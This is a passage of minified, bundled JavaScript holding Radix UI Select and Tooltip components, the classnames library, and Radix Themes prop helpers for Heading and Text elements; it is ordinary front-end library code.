            id: Y.textId,
            ...w,
            ref: Q
        }), Y.isSelected && b.valueNode && !b.valueNodeHasChildren ? reactDomExports.createPortal(w.children, b.valueNode) : null]
    })
}
);
SelectItemText.displayName = ITEM_TEXT_NAME;
var ITEM_INDICATOR_NAME = "SelectItemIndicator"
  , SelectItemIndicator = reactExports.forwardRef( (_, M) => {
    const {__scopeSelect: j, ...O} = _;
    return useSelectItemContext(ITEM_INDICATOR_NAME, j).isSelected ? jsxRuntimeExports.jsx(Primitive$1.span, {
        "aria-hidden": !0,
        ...O,
        ref: M
    }) : null
}
);
SelectItemIndicator.displayName = ITEM_INDICATOR_NAME;
var SCROLL_UP_BUTTON_NAME = "SelectScrollUpButton"
  , SelectScrollUpButton = reactExports.forwardRef( (_, M) => {
    const j = useSelectContentContext(SCROLL_UP_BUTTON_NAME, _.__scopeSelect)
      , O = useSelectViewportContext(SCROLL_UP_BUTTON_NAME, _.__scopeSelect)
      , [x,w] = reactExports.useState(!1)
      , b = useComposedRefs(M, O.onScrollButtonChange);
    return useLayoutEffect2( () => {
        if (j.viewport && j.isPositioned) {
            let X = function() {
                const F = Y.scrollTop > 0;
                w(F)
            };
            const Y = j.viewport;
            return X(),
            Y.addEventListener("scroll", X),
            () => Y.removeEventListener("scroll", X)
        }
    }
    , [j.viewport, j.isPositioned]),
    x ? jsxRuntimeExports.jsx(SelectScrollButtonImpl, {
        ..._,
        ref: b,
        onAutoScroll: () => {
            const {viewport: X, selectedItem: Y} = j;
            X && Y && (X.scrollTop = X.scrollTop - Y.offsetHeight)
        }
    }) : null
}
);
SelectScrollUpButton.displayName = SCROLL_UP_BUTTON_NAME;
var SCROLL_DOWN_BUTTON_NAME = "SelectScrollDownButton"
  , SelectScrollDownButton = reactExports.forwardRef( (_, M) => {
    const j = useSelectContentContext(SCROLL_DOWN_BUTTON_NAME, _.__scopeSelect)
      , O = useSelectViewportContext(SCROLL_DOWN_BUTTON_NAME, _.__scopeSelect)
      , [x,w] = reactExports.useState(!1)
      , b = useComposedRefs(M, O.onScrollButtonChange);
    return useLayoutEffect2( () => {
        if (j.viewport && j.isPositioned) {
            let X = function() {
                const F = Y.scrollHeight - Y.clientHeight
                  , V = Math.ceil(Y.scrollTop) < F;
                w(V)
            };
            const Y = j.viewport;
            return X(),
            Y.addEventListener("scroll", X),
            () => Y.removeEventListener("scroll", X)
        }
    }
    , [j.viewport, j.isPositioned]),
    x ? jsxRuntimeExports.jsx(SelectScrollButtonImpl, {
        ..._,
        ref: b,
        onAutoScroll: () => {
            const {viewport: X, selectedItem: Y} = j;
            X && Y && (X.scrollTop = X.scrollTop + Y.offsetHeight)
        }
    }) : null
}
);
SelectScrollDownButton.displayName = SCROLL_DOWN_BUTTON_NAME;
var SelectScrollButtonImpl = reactExports.forwardRef( (_, M) => {
    const {__scopeSelect: j, onAutoScroll: O, ...x} = _
      , w = useSelectContentContext("SelectScrollButton", j)
      , b = reactExports.useRef(null)
      , X = useCollection(j)
      , Y = reactExports.useCallback( () => {
        b.current !== null && (window.clearInterval(b.current),
        b.current = null)
    }
    , []);
    return reactExports.useEffect( () => () => Y(), [Y]),
    useLayoutEffect2( () => {
        var V;
        const F = X().find(K => K.ref.current === document.activeElement);
        (V = F == null ? void 0 : F.ref.current) == null || V.scrollIntoView({
            block: "nearest"
        })
    }
    , [X]),
    jsxRuntimeExports.jsx(Primitive$1.div, {
        "aria-hidden": !0,
        ...x,
        ref: M,
        style: {
            flexShrink: 0,
            ...x.style
        },
        onPointerDown: composeEventHandlers$1(x.onPointerDown, () => {
            b.current === null && (b.current = window.setInterval(O, 50))
        }
        ),
        onPointerMove: composeEventHandlers$1(x.onPointerMove, () => {
            var F;
            (F = w.onItemLeave) == null || F.call(w),
            b.current === null && (b.current = window.setInterval(O, 50))
        }
        ),
        onPointerLeave: composeEventHandlers$1(x.onPointerLeave, () => {
            Y()
        }
        )
    })
}
)
  , SEPARATOR_NAME = "SelectSeparator"
  , SelectSeparator = reactExports.forwardRef( (_, M) => {
    const {__scopeSelect: j, ...O} = _;
    return jsxRuntimeExports.jsx(Primitive$1.div, {
        "aria-hidden": !0,
        ...O,
        ref: M
    })
}
);
SelectSeparator.displayName = SEPARATOR_NAME;
var ARROW_NAME$1 = "SelectArrow"
  , SelectArrow = reactExports.forwardRef( (_, M) => {
    const {__scopeSelect: j, ...O} = _
      , x = usePopperScope$1(j)
      , w = useSelectContext(ARROW_NAME$1, j)
      , b = useSelectContentContext(ARROW_NAME$1, j);
    return w.open && b.position === "popper" ? jsxRuntimeExports.jsx(Arrow, {
        ...x,
        ...O,
        ref: M
    }) : null
}
);
SelectArrow.displayName = ARROW_NAME$1;
var BUBBLE_INPUT_NAME = "SelectBubbleInput"
  , SelectBubbleInput = reactExports.forwardRef( ({__scopeSelect: _, value: M, ...j}, O) => {
    const x = reactExports.useRef(null)
      , w = useComposedRefs(O, x)
      , b = usePrevious(M);
    return reactExports.useEffect( () => {
        const X = x.current;
        if (!X)
            return;
        const Y = window.HTMLSelectElement.prototype
          , V = Object.getOwnPropertyDescriptor(Y, "value").set;
        if (b !== M && V) {
            const K = new Event("change",{
                bubbles: !0
            });
            V.call(X, M),
            X.dispatchEvent(K)
        }
    }
    , [b, M]),
    jsxRuntimeExports.jsx(Primitive$1.select, {
        ...j,
        style: {
            ...VISUALLY_HIDDEN_STYLES,
            ...j.style
        },
        ref: w,
        defaultValue: M
    })
}
);
SelectBubbleInput.displayName = BUBBLE_INPUT_NAME;
function shouldShowPlaceholder(_) {
    return _ === "" || _ === void 0
}
function useTypeaheadSearch(_) {
    const M = useCallbackRef$1(_)
      , j = reactExports.useRef("")
      , O = reactExports.useRef(0)
      , x = reactExports.useCallback(b => {
        const X = j.current + b;
        M(X),
        function Y(F) {
            j.current = F,
            window.clearTimeout(O.current),
            F !== "" && (O.current = window.setTimeout( () => Y(""), 1e3))
        }(X)
    }
    , [M])
      , w = reactExports.useCallback( () => {
        j.current = "",
        window.clearTimeout(O.current)
    }
    , []);
    return reactExports.useEffect( () => () => window.clearTimeout(O.current), []),
    [j, x, w]
}
function findNextItem(_, M, j) {
    const x = M.length > 1 && Array.from(M).every(F => F === M[0]) ? M[0] : M
      , w = j ? _.indexOf(j) : -1;
    let b = wrapArray(_, Math.max(w, 0));
    x.length === 1 && (b = b.filter(F => F !== j));
    const Y = b.find(F => F.textValue.toLowerCase().startsWith(x.toLowerCase()));
    return Y !== j ? Y : void 0
}
function wrapArray(_, M) {
    return _.map( (j, O) => _[(M + O) % _.length])
}
var Root2 = Select
  , Trigger$1 = SelectTrigger
  , Value = SelectValue
  , Icon = SelectIcon
  , Portal$1 = SelectPortal
  , Content2$1 = SelectContent
  , Viewport = SelectViewport
  , Group = SelectGroup
  , Label = SelectLabel
  , Item = SelectItem
  , ItemText = SelectItemText
  , ItemIndicator = SelectItemIndicator
  , Separator = SelectSeparator
  , [createTooltipContext,createTooltipScope] = createContextScope("Tooltip", [createPopperScope])
  , usePopperScope = createPopperScope()
  , PROVIDER_NAME = "TooltipProvider"
  , DEFAULT_DELAY_DURATION = 700
  , TOOLTIP_OPEN = "tooltip.open"
  , [TooltipProviderContextProvider,useTooltipProviderContext] = createTooltipContext(PROVIDER_NAME)
  , TooltipProvider = _ => {
    const {__scopeTooltip: M, delayDuration: j=DEFAULT_DELAY_DURATION, skipDelayDuration: O=300, disableHoverableContent: x=!1, children: w} = _
      , b = reactExports.useRef(!0)
      , X = reactExports.useRef(!1)
      , Y = reactExports.useRef(0);
    return reactExports.useEffect( () => {
        const F = Y.current;
        return () => window.clearTimeout(F)
    }
    , []),
    jsxRuntimeExports.jsx(TooltipProviderContextProvider, {
        scope: M,
        isOpenDelayedRef: b,
        delayDuration: j,
        onOpen: reactExports.useCallback( () => {
            window.clearTimeout(Y.current),
            b.current = !1
        }
        , []),
        onClose: reactExports.useCallback( () => {
            window.clearTimeout(Y.current),
            Y.current = window.setTimeout( () => b.current = !0, O)
        }
        , [O]),
        isPointerInTransitRef: X,
        onPointerInTransitChange: reactExports.useCallback(F => {
            X.current = F
        }
        , []),
        disableHoverableContent: x,
        children: w
    })
}
;
TooltipProvider.displayName = PROVIDER_NAME;
var TOOLTIP_NAME = "Tooltip"
  , [TooltipContextProvider,useTooltipContext] = createTooltipContext(TOOLTIP_NAME)
  , Tooltip = _ => {
    const {__scopeTooltip: M, children: j, open: O, defaultOpen: x, onOpenChange: w, disableHoverableContent: b, delayDuration: X} = _
      , Y = useTooltipProviderContext(TOOLTIP_NAME, _.__scopeTooltip)
      , F = usePopperScope(M)
      , [V,K] = reactExports.useState(null)
      , Q = useId()
      , ee = reactExports.useRef(0)
      , ae = b ?? Y.disableHoverableContent
      , ne = X ?? Y.delayDuration
      , oe = reactExports.useRef(!1)
      , [ue,fe] = useControllableState({
        prop: O,
        defaultProp: x ?? !1,
        onChange: xe => {
            xe ? (Y.onOpen(),
            document.dispatchEvent(new CustomEvent(TOOLTIP_OPEN))) : Y.onClose(),
            w == null || w(xe)
        }
        ,
        caller: TOOLTIP_NAME
    })
      , he = reactExports.useMemo( () => ue ? oe.current ? "delayed-open" : "instant-open" : "closed", [ue])
      , pe = reactExports.useCallback( () => {
        window.clearTimeout(ee.current),
        ee.current = 0,
        oe.current = !1,
        fe(!0)
    }
    , [fe])
      , ye = reactExports.useCallback( () => {
        window.clearTimeout(ee.current),
        ee.current = 0,
        fe(!1)
    }
    , [fe])
      , be = reactExports.useCallback( () => {
        window.clearTimeout(ee.current),
        ee.current = window.setTimeout( () => {
            oe.current = !0,
            fe(!0),
            ee.current = 0
        }
        , ne)
    }
    , [ne, fe]);
    return reactExports.useEffect( () => () => {
        ee.current && (window.clearTimeout(ee.current),
        ee.current = 0)
    }
    , []),
    jsxRuntimeExports.jsx(Root2$1, {
        ...F,
        children: jsxRuntimeExports.jsx(TooltipContextProvider, {
            scope: M,
            contentId: Q,
            open: ue,
            stateAttribute: he,
            trigger: V,
            onTriggerChange: K,
            onTriggerEnter: reactExports.useCallback( () => {
                Y.isOpenDelayedRef.current ? be() : pe()
            }
            , [Y.isOpenDelayedRef, be, pe]),
            onTriggerLeave: reactExports.useCallback( () => {
                ae ? ye() : (window.clearTimeout(ee.current),
                ee.current = 0)
            }
            , [ye, ae]),
            onOpen: pe,
            onClose: ye,
            disableHoverableContent: ae,
            children: j
        })
    })
}
;
Tooltip.displayName = TOOLTIP_NAME;
var TRIGGER_NAME = "TooltipTrigger"
  , TooltipTrigger = reactExports.forwardRef( (_, M) => {
    const {__scopeTooltip: j, ...O} = _
      , x = useTooltipContext(TRIGGER_NAME, j)
      , w = useTooltipProviderContext(TRIGGER_NAME, j)
      , b = usePopperScope(j)
      , X = reactExports.useRef(null)
      , Y = useComposedRefs(M, X, x.onTriggerChange)
      , F = reactExports.useRef(!1)
      , V = reactExports.useRef(!1)
      , K = reactExports.useCallback( () => F.current = !1, []);
    return reactExports.useEffect( () => () => document.removeEventListener("pointerup", K), [K]),
    jsxRuntimeExports.jsx(Anchor, {
        asChild: !0,
        ...b,
        children: jsxRuntimeExports.jsx(Primitive$1.button, {
            "aria-describedby": x.open ? x.contentId : void 0,
            "data-state": x.stateAttribute,
            ...O,
            ref: Y,
            onPointerMove: composeEventHandlers$1(_.onPointerMove, Q => {
                Q.pointerType !== "touch" && !V.current && !w.isPointerInTransitRef.current && (x.onTriggerEnter(),
                V.current = !0)
            }
            ),
            onPointerLeave: composeEventHandlers$1(_.onPointerLeave, () => {
                x.onTriggerLeave(),
                V.current = !1
            }
            ),
            onPointerDown: composeEventHandlers$1(_.onPointerDown, () => {
                x.open && x.onClose(),
                F.current = !0,
                document.addEventListener("pointerup", K, {
                    once: !0
                })
            }
            ),
            onFocus: composeEventHandlers$1(_.onFocus, () => {
                F.current || x.onOpen()
            }
            ),
            onBlur: composeEventHandlers$1(_.onBlur, x.onClose),
            onClick: composeEventHandlers$1(_.onClick, x.onClose)
        })
    })
}
);
TooltipTrigger.displayName = TRIGGER_NAME;
var PORTAL_NAME = "TooltipPortal"
  , [PortalProvider,usePortalContext] = createTooltipContext(PORTAL_NAME, {
    forceMount: void 0
})
  , TooltipPortal = _ => {
    const {__scopeTooltip: M, forceMount: j, children: O, container: x} = _
      , w = useTooltipContext(PORTAL_NAME, M);
    return jsxRuntimeExports.jsx(PortalProvider, {
        scope: M,
        forceMount: j,
        children: jsxRuntimeExports.jsx(Presence, {
            present: j || w.open,
            children: jsxRuntimeExports.jsx(Portal$4, {
                asChild: !0,
                container: x,
                children: O
            })
        })
    })
}
;
TooltipPortal.displayName = PORTAL_NAME;
var CONTENT_NAME = "TooltipContent"
  , TooltipContent = reactExports.forwardRef( (_, M) => {
    const j = usePortalContext(CONTENT_NAME, _.__scopeTooltip)
      , {forceMount: O=j.forceMount, side: x="top", ...w} = _
      , b = useTooltipContext(CONTENT_NAME, _.__scopeTooltip);
    return jsxRuntimeExports.jsx(Presence, {
        present: O || b.open,
        children: b.disableHoverableContent ? jsxRuntimeExports.jsx(TooltipContentImpl, {
            side: x,
            ...w,
            ref: M
        }) : jsxRuntimeExports.jsx(TooltipContentHoverable, {
            side: x,
            ...w,
            ref: M
        })
    })
}
)
  , TooltipContentHoverable = reactExports.forwardRef( (_, M) => {
    const j = useTooltipContext(CONTENT_NAME, _.__scopeTooltip)
      , O = useTooltipProviderContext(CONTENT_NAME, _.__scopeTooltip)
      , x = reactExports.useRef(null)
      , w = useComposedRefs(M, x)
      , [b,X] = reactExports.useState(null)
      , {trigger: Y, onClose: F} = j
      , V = x.current
      , {onPointerInTransitChange: K} = O
      , Q = reactExports.useCallback( () => {
        X(null),
        K(!1)
    }
    , [K])
      , ee = reactExports.useCallback( (ae, ne) => {
        const oe = ae.currentTarget
          , ue = {
            x: ae.clientX,
            y: ae.clientY
        }
          , fe = getExitSideFromRect(ue, oe.getBoundingClientRect())
          , he = getPaddedExitPoints(ue, fe)
          , pe = getPointsFromRect(ne.getBoundingClientRect())
          , ye = getHull([...he, ...pe]);
        X(ye),
        K(!0)
    }
    , [K]);
    return reactExports.useEffect( () => () => Q(), [Q]),
    reactExports.useEffect( () => {
        if (Y && V) {
            const ae = oe => ee(oe, V)
              , ne = oe => ee(oe, Y);
            return Y.addEventListener("pointerleave", ae),
            V.addEventListener("pointerleave", ne),
            () => {
                Y.removeEventListener("pointerleave", ae),
                V.removeEventListener("pointerleave", ne)
            }
        }
    }
    , [Y, V, ee, Q]),
    reactExports.useEffect( () => {
        if (b) {
            const ae = ne => {
                const oe = ne.target
                  , ue = {
                    x: ne.clientX,
                    y: ne.clientY
                }
                  , fe = (Y == null ? void 0 : Y.contains(oe)) || (V == null ? void 0 : V.contains(oe))
                  , he = !isPointInPolygon(ue, b);
                fe ? Q() : he && (Q(),
                F())
            }
            ;
            return document.addEventListener("pointermove", ae),
            () => document.removeEventListener("pointermove", ae)
        }
    }
    , [Y, V, b, F, Q]),
    jsxRuntimeExports.jsx(TooltipContentImpl, {
        ..._,
        ref: w
    })
}
)
  , [VisuallyHiddenContentContextProvider,useVisuallyHiddenContentContext] = createTooltipContext(TOOLTIP_NAME, {
    isInside: !1
})
  , Slottable = createSlottable("TooltipContent")
  , TooltipContentImpl = reactExports.forwardRef( (_, M) => {
    const {__scopeTooltip: j, children: O, "aria-label": x, onEscapeKeyDown: w, onPointerDownOutside: b, ...X} = _
      , Y = useTooltipContext(CONTENT_NAME, j)
      , F = usePopperScope(j)
      , {onClose: V} = Y;
    return reactExports.useEffect( () => (document.addEventListener(TOOLTIP_OPEN, V),
    () => document.removeEventListener(TOOLTIP_OPEN, V)), [V]),
    reactExports.useEffect( () => {
        if (Y.trigger) {
            const K = Q => {
                const ee = Q.target;
                ee != null && ee.contains(Y.trigger) && V()
            }
            ;
            return window.addEventListener("scroll", K, {
                capture: !0
            }),
            () => window.removeEventListener("scroll", K, {
                capture: !0
            })
        }
    }
    , [Y.trigger, V]),
    jsxRuntimeExports.jsx(DismissableLayer, {
        asChild: !0,
        disableOutsidePointerEvents: !1,
        onEscapeKeyDown: w,
        onPointerDownOutside: b,
        onFocusOutside: K => K.preventDefault(),
        onDismiss: V,
        children: jsxRuntimeExports.jsxs(Content, {
            "data-state": Y.stateAttribute,
            ...F,
            ...X,
            ref: M,
            style: {
                ...X.style,
                "--radix-tooltip-content-transform-origin": "var(--radix-popper-transform-origin)",
                "--radix-tooltip-content-available-width": "var(--radix-popper-available-width)",
                "--radix-tooltip-content-available-height": "var(--radix-popper-available-height)",
                "--radix-tooltip-trigger-width": "var(--radix-popper-anchor-width)",
                "--radix-tooltip-trigger-height": "var(--radix-popper-anchor-height)"
            },
            children: [jsxRuntimeExports.jsx(Slottable, {
                children: O
            }), jsxRuntimeExports.jsx(VisuallyHiddenContentContextProvider, {
                scope: j,
                isInside: !0,
                children: jsxRuntimeExports.jsx(Root$4, {
                    id: Y.contentId,
                    role: "tooltip",
                    children: x || O
                })
            })]
        })
    })
}
);
TooltipContent.displayName = CONTENT_NAME;
var ARROW_NAME = "TooltipArrow"
  , TooltipArrow = reactExports.forwardRef( (_, M) => {
    const {__scopeTooltip: j, ...O} = _
      , x = usePopperScope(j);
    return useVisuallyHiddenContentContext(ARROW_NAME, j).isInside ? null : jsxRuntimeExports.jsx(Arrow, {
        ...x,
        ...O,
        ref: M
    })
}
);
TooltipArrow.displayName = ARROW_NAME;
function getExitSideFromRect(_, M) {
    const j = Math.abs(M.top - _.y)
      , O = Math.abs(M.bottom - _.y)
      , x = Math.abs(M.right - _.x)
      , w = Math.abs(M.left - _.x);
    switch (Math.min(j, O, x, w)) {
    case w:
        return "left";
    case x:
        return "right";
    case j:
        return "top";
    case O:
        return "bottom";
    default:
        throw new Error("unreachable")
    }
}
function getPaddedExitPoints(_, M, j=5) {
    const O = [];
    switch (M) {
    case "top":
        O.push({
            x: _.x - j,
            y: _.y + j
        }, {
            x: _.x + j,
            y: _.y + j
        });
        break;
    case "bottom":
        O.push({
            x: _.x - j,
            y: _.y - j
        }, {
            x: _.x + j,
            y: _.y - j
        });
        break;
    case "left":
        O.push({
            x: _.x + j,
            y: _.y - j
        }, {
            x: _.x + j,
            y: _.y + j
        });
        break;
    case "right":
        O.push({
            x: _.x - j,
            y: _.y - j
        }, {
            x: _.x - j,
            y: _.y + j
        });
        break
    }
    return O
}
function getPointsFromRect(_) {
    const {top: M, right: j, bottom: O, left: x} = _;
    return [{
        x,
        y: M
    }, {
        x: j,
        y: M
    }, {
        x: j,
        y: O
    }, {
        x,
        y: O
    }]
}
function isPointInPolygon(_, M) {
    const {x: j, y: O} = _;
    let x = !1;
    for (let w = 0, b = M.length - 1; w < M.length; b = w++) {
        const X = M[w]
          , Y = M[b]
          , F = X.x
          , V = X.y
          , K = Y.x
          , Q = Y.y;
        V > O != Q > O && j < (K - F) * (O - V) / (Q - V) + F && (x = !x)
    }
    return x
}
function getHull(_) {
    const M = _.slice();
    return M.sort( (j, O) => j.x < O.x ? -1 : j.x > O.x ? 1 : j.y < O.y ? -1 : j.y > O.y ? 1 : 0),
    getHullPresorted(M)
}
function getHullPresorted(_) {
    if (_.length <= 1)
        return _.slice();
    const M = [];
    for (let O = 0; O < _.length; O++) {
        const x = _[O];
        for (; M.length >= 2; ) {
            const w = M[M.length - 1]
              , b = M[M.length - 2];
            if ((w.x - b.x) * (x.y - b.y) >= (w.y - b.y) * (x.x - b.x))
                M.pop();
            else
                break
        }
        M.push(x)
    }
    M.pop();
    const j = [];
    for (let O = _.length - 1; O >= 0; O--) {
        const x = _[O];
        for (; j.length >= 2; ) {
            const w = j[j.length - 1]
              , b = j[j.length - 2];
            if ((w.x - b.x) * (x.y - b.y) >= (w.y - b.y) * (x.x - b.x))
                j.pop();
            else
                break
        }
        j.push(x)
    }
    return j.pop(),
    M.length === 1 && j.length === 1 && M[0].x === j[0].x && M[0].y === j[0].y ? M : M.concat(j)
}
var Provider = TooltipProvider
  , Root3 = Tooltip
  , Trigger = TooltipTrigger
  , Portal = TooltipPortal
  , Content2 = TooltipContent
  , Arrow2 = TooltipArrow
  , classnames = {
    exports: {}
};
/*!
	Copyright (c) 2018 Jed Watson.
	Licensed under the MIT License (MIT), see
	http://jedwatson.github.io/classnames
*/
var hasRequiredClassnames;
function requireClassnames() {
    return hasRequiredClassnames || (hasRequiredClassnames = 1,
    function(_) {
        (function() {
            var M = {}.hasOwnProperty;
            function j() {
                for (var w = "", b = 0; b < arguments.length; b++) {
                    var X = arguments[b];
                    X && (w = x(w, O(X)))
                }
                return w
            }
            function O(w) {
                if (typeof w == "string" || typeof w == "number")
                    return w;
                if (typeof w != "object")
                    return "";
                if (Array.isArray(w))
                    return j.apply(null, w);
                if (w.toString !== Object.prototype.toString && !w.toString.toString().includes("[native code]"))
                    return w.toString();
                var b = "";
                for (var X in w)
                    M.call(w, X) && w[X] && (b = x(b, X));
                return b
            }
            function x(w, b) {
                return b ? w ? w + " " + b : w + b : w
            }
            _.exports ? (j.default = j,
            _.exports = j) : window.classNames = j
        }
        )()
    }(classnames)),
    classnames.exports
}
var classnamesExports = requireClassnames();
const y$2 = getDefaultExportFromCjs$1(classnamesExports)
  , o$8 = {
    asChild: {
        type: "boolean"
    }
}
  , t$8 = {
    width: {
        type: "string",
        className: "rt-r-w",
        customProperties: ["--width"],
        responsive: !0
    },
    minWidth: {
        type: "string",
        className: "rt-r-min-w",
        customProperties: ["--min-width"],
        responsive: !0
    },
    maxWidth: {
        type: "string",
        className: "rt-r-max-w",
        customProperties: ["--max-width"],
        responsive: !0
    }
}
  , e$h = {
    height: {
        type: "string",
        className: "rt-r-h",
        customProperties: ["--height"],
        responsive: !0
    },
    minHeight: {
        type: "string",
        className: "rt-r-min-h",
        customProperties: ["--min-height"],
        responsive: !0
    },
    maxHeight: {
        type: "string",
        className: "rt-r-max-h",
        customProperties: ["--max-height"],
        responsive: !0
    }
}
  , r$f = ["1", "2", "3", "4"]
  , s$6 = {
    ...o$8,
    align: {
        type: "enum",
        className: "rt-r-align",
        values: ["start", "center"],
        default: "center"
    },
    size: {
        type: "enum",
        className: "rt-r-size",
        values: r$f,
        default: "3",
        responsive: !0
    },
    width: t$8.width,
    minWidth: t$8.minWidth,
    maxWidth: {
        ...t$8.maxWidth,
        default: "600px"
    },
    ...e$h
}
  , o$7 = ["gray", "gold", "bronze", "brown", "yellow", "amber", "orange", "tomato", "red", "ruby", "crimson", "pink", "plum", "purple", "violet", "iris", "indigo", "blue", "cyan", "teal", "jade", "green", "grass", "lime", "mint", "sky"]
  , r$e = {
    color: {
        type: "enum",
        values: o$7,
        default: void 0
    }
}
  , s$5 = {
    color: {
        type: "enum",
        values: o$7,
        default: ""
    }
}
  , o$6 = {
    highContrast: {
        type: "boolean",
        className: "rt-high-contrast",
        default: void 0
    }
}
  , e$g = ["normal", "start", "end", "both"]
  , r$d = {
    trim: {
        type: "enum",
        className: "rt-r-lt",
        values: e$g,
        responsive: !0
    }
}
  , e$f = ["left", "center", "right"]
  , t$7 = {
    align: {
        type: "enum",
        className: "rt-r-ta",
        values: e$f,
        responsive: !0
    }
}
  , e$e = ["wrap", "nowrap", "pretty", "balance"]
  , r$c = {
    wrap: {
        type: "enum",
        className: "rt-r-tw",
        values: e$e,
        responsive: !0
    }
}
  , e$d = {
    truncate: {
        type: "boolean",
        className: "rt-truncate"
    }
}
  , e$c = ["light", "regular", "medium", "bold"]
  , t$6 = {
    weight: {
        type: "enum",
        className: "rt-r-weight",
        values: e$c,
        responsive: !0
    }
}
  , m$3 = ["h1", "h2", "h3", "h4", "h5", "h6"]
  , a$9 = ["1", "2", "3", "4", "5", "6", "7", "8", "9"]
  , n$7 = {
    as: {
        type: "enum",
        values: m$3,
        default: "h1"
    },
    ...o$8,
    size: {
        type: "enum",
        className: "rt-r-size",
        values: a$9,
        default: "6",
        responsive: !0
    },
    ...t$6,
    ...t$7,
    ...r$d,
    ...e$d,
    ...r$c,
    ...r$e,
    ...o$6
}
  , e$b = ["initial", "xs", "sm", "md", "lg", "xl"];
function e$a(_, M) {
    return Object.prototype.hasOwnProperty.call(_, M)
}
function i$7(_) {
    return typeof _ == "object" && Object.keys(_).some(M => e$b.includes(M))
}
function R$2({className: _, customProperties: M, ...j}) {
    const O = g$3({
        allowArbitraryValues: !0,
        className: _,
        ...j
    })
      , x = m$2({
        customProperties: M,
        ...j
    });
    return [O, x]
}
function g$3({allowArbitraryValues: _, value: M, className: j, propValues: O, parseValue: x=w => w}) {
    const w = [];
    if (M) {
        if (typeof M == "string" && O.includes(M))
            return l$3(j, M, x);
        if (i$7(M)) {
            const b = M;
            for (const X in b) {
                if (!e$a(b, X) || !e$b.includes(X))
                    continue;
                const Y = b[X];
                if (Y !== void 0) {
                    if (O.includes(Y)) {
                        const F = l$3(j, Y, x)
                          , V = X === "initial" ? F : `${X}:${F}`;
                        w.push(V)
                    } else if (_) {
                        const F = X === "initial" ? j : `${X}:${j}`;
                        w.push(F)
                    }
                }
            }
            return w.join(" ")
        }
        if (_)
            return j
    }
}
function l$3(_, M, j) {
    const O = _ ? "-" : ""
      , x = j(M)
      , w = x == null ? void 0 : x.startsWith("-")
      , b = w ? "-" : ""
      , X = w ? x == null ? void 0 : x.substring(1) : x;
    return `${b}${_}${O}${X}`
}
function m$2({customProperties: _, value: M, propValues: j, parseValue: O=x => x}) {
    let x = {};
    if (!(!M || typeof M == "string" && j.includes(M))) {
        if (typeof M == "string" && (x = Object.fromEntries(_.map(w => [w, M]))),
        i$7(M)) {
            const w = M;
            for (const b in w) {
                if (!e$a(w, b) || !e$b.includes(b))
                    continue;
                const X = w[b];
                if (!j.includes(X))
                    for (const Y of _)
                        x = {
                            [b === "initial" ? Y : `${Y}-${b}`]: X,
                            ...x
                        }
            }
        }
        for (const w in x) {
            const b = x[w];
            b !== void 0 && (x[w] = O(b))
        }
        return x
    }
}
function l$2(..._) {
    let M = {};
    for (const j of _)
        j && (M = {
            ...M,
            ...j
        });
    return Object.keys(M).length ? M : void 0
}
function N$1(..._) {
    return Object.assign({}, ..._)
}
function v$2(_, ...M) {
    let j, O;
    const x = {
        ..._
    }
      , w = N$1(...M);
    for (const b in w) {
        let X = x[b];
        const Y = w[b];
        if (Y.default !== void 0 && X === void 0 && (X = Y.default),
        Y.type === "enum" && ![Y.default, ...Y.values].includes(X) && !i$7(X) && (X = Y.default),
        x[b] = X,
        "className"in Y && Y.className) {
            delete x[b];
            const F = "responsive"in Y;
            if (!X || i$7(X) && !F)
                continue;
            if (i$7(X) && (Y.default !== void 0 && X.initial === void 0 && (X.initial = Y.default),
            Y.type === "enum" && ([Y.default, ...Y.values].includes(X.initial) || (X.initial = Y.default))),
            Y.type === "enum") {
                const V = g$3({
                    allowArbitraryValues: !1,
                    value: X,
                    className: Y.className,
                    propValues: Y.values,
                    parseValue: Y.parseValue
                });
                j = y$2(j, V);
                continue
            }
            if (Y.type === "string" || Y.type === "enum | string") {
                const V = Y.type === "string" ? [] : Y.values
                  , [K,Q] = R$2({
                    className: Y.className,
                    customProperties: Y.customProperties,
                    propValues: V,
                    parseValue: Y.parseValue,
                    value: X
                });
                O = l$2(O, Q),
                j = y$2(j, K);
                continue
            }
            if (Y.type === "boolean" && X) {
                j = y$2(j, Y.className);
                continue
            }
        }
    }
    return x.className = y$2(j, _.className),
    x.style = l$2(O, _.style),
    x
}
const e$9 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "-1", "-2", "-3", "-4", "-5", "-6", "-7", "-8", "-9"]
  , r$b = {
    m: {
        type: "enum | string",
        values: e$9,
        responsive: !0,
        className: "rt-r-m",
        customProperties: ["--m"]
    },
    mx: {
        type: "enum | string",
        values: e$9,
        responsive: !0,
        className: "rt-r-mx",
        customProperties: ["--ml", "--mr"]
    },
    my: {
        type: "enum | string",
        values: e$9,
        responsive: !0,
        className: "rt-r-my",
        customProperties: ["--mt", "--mb"]
    },
    mt: {
        type: "enum | string",
        values: e$9,
        responsive: !0,
        className: "rt-r-mt",
        customProperties: ["--mt"]
    },
    mr: {
        type: "enum | string",
        values: e$9,
        responsive: !0,
        className: "rt-r-mr",
        customProperties: ["--mr"]
    },
    mb: {
        type: "enum | string",
        values: e$9,
        responsive: !0,
        className: "rt-r-mb",
        customProperties: ["--mb"]
    },
    ml: {
        type: "enum | string",
        values: e$9,
        responsive: !0,
        className: "rt-r-ml",
        customProperties: ["--ml"]
    }
}
  , r$a = reactExports.forwardRef( (_, M) => {
    const {children: j, className: O, asChild: x, as: w="h1", color: b, ...X} = v$2(_, n$7, r$b);
    return reactExports.createElement(Slot$3, {
        "data-accent-color": b,
        ...X,
        ref: M,
        className: y$2("rt-Heading", O)
    }, x ? j : reactExports.createElement(w, null, j))
}
);
r$a.displayName = "Heading";
const m$1 = ["span", "div", "label", "p"]
  , a$8 = ["1", "2", "3", "4", "5", "6", "7", "8", "9"]
  , n$6 = {
    as: {
        type: "enum",
        values: m$1,
        default: "span"
    },
    ...o$8,
    size: {
        type: "enum",
        className: "rt-r-size",
        values: a$8,
        responsive: !0
    },
    ...t$6,
    ...t$7,
    ...r$d,
    ...e$d,
    ...r$c,
    ...r$e,
    ...o$6
}
  , p$8 = reactExports.forwardRef( (_, M) => {
    const {children: j, className: O, asChild: x, as: w="span", color: b, ...X} = v$2(_, n$6, r$b);
    return reactExports.createElement(Slot$3, {
        "data-accent-color": b,
        ...X,
        ref: M,
        className: y$2("rt-Text", O)
    }, x ? j : reactExports.createElement(w, null, j))
}
);
p$8.displayName = "Text";
function a$7(_) {
    switch (_) {
    case "tomato":
    case "red":
    case "ruby":
    case "crimson":
    case "pink":
    case "plum":
    case "purple":
    case "violet":
        return "mauve";
    case "iris":
    case "indigo":
    case "blue":
    case "sky":
    case "cyan":
        return "slate";
    case "teal":
